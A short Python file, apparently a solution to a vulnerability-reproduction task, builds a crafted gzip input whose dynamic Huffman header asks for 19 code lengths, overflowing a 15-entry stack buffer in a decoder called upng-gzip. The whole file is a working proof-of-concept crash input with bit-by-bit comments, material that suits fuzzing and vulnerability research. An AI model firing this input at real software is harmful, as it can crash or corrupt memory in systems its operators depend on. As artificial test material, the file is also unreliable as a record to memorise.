import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in upng-gzip.
        The vulnerability is caused by a code length array sized to 15, while
        the dynamic block header (HCLEN) can specify up to 19 code lengths.
        """
        # GZIP Header (10 bytes):
        # ID1(1f) ID2(8b) CM(08) FLG(00) MTIME(00000000) XFL(00) OS(03)
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'

        # Deflate Block Payload (9 bytes):
        # We construct a Dynamic Huffman block (BTYPE=2) with HCLEN=15 (Max).
        # HCLEN=15 implies 19 code length codes will be read.
        # The vulnerable buffer is size 15, so writing the 16th+ code length overflows.
        
        # Bitstream construction (LSB first):
        # Byte 0: 0x05 -> Bits: 1, 0, 1, 0, 0, 0, 0, 0
        #   - BFINAL (1 bit): 1
        #   - BTYPE (2 bits): 10 (binary 2, dynamic). Stream order: 0, 1.
        #   - HLIT (5 bits): 00000 (257 literals)
        # Byte 1: 0xE0 -> Bits: 0, 0, 0, 0, 0, 1, 1, 1
        #   - HDIST (5 bits): 00000 (1 distance)
        #   - HCLEN_lo (3 bits): 111 (Part of 15)
        # Byte 2: 0x01 -> Bits: 1, 0, 0, 0, 0, 0, 0, 0
        #   - HCLEN_hi (1 bit): 1. Combined HCLEN = 1111 (15).
        #   - Code Lengths (3 bits each): 000, 000, ...
        # Bytes 3-8: 0x00 -> Continuing zero code lengths.
        #
        # Total bits needed for 19 codes: 19 * 3 = 57 bits.
        # Header consumes 17 bits. Total 74 bits.
        # 9 bytes payload = 72 bits. This provides 18 full codes (enough to overflow index 15).
        payload = b'\x05\xE0\x01\x00\x00\x00\x00\x00\x00'

        # GZIP Footer (8 bytes):
        # CRC32 (4 bytes) + ISIZE (4 bytes). Values irrelevant for crash.
        footer = b'\x00' * 8

        return header + payload + footer